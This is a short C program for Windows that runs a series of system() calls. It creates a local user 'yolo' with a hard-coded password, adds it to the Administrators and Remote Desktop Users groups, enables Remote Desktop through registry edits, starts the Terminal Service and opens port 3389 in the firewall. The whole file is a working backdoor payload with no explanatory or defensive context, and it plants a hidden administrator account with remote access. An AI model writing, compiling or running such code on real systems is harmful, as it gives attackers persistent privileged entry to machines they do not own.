#include <stdlib.h>
int main ()
{
    int i;
    i = system("net user yolo YOLO1!Aa12 /add");
    i = system("net localgroup \"Remote Desktop users\" yolo /add");
    i = system("net localgroup Administrators yolo /add");

    i = system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    i = system("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f");
    i = system("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f");

    i = system("sc config TermService start= auto");
    i = system("net start Termservice");
    i = system("netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389");

    return 0;
}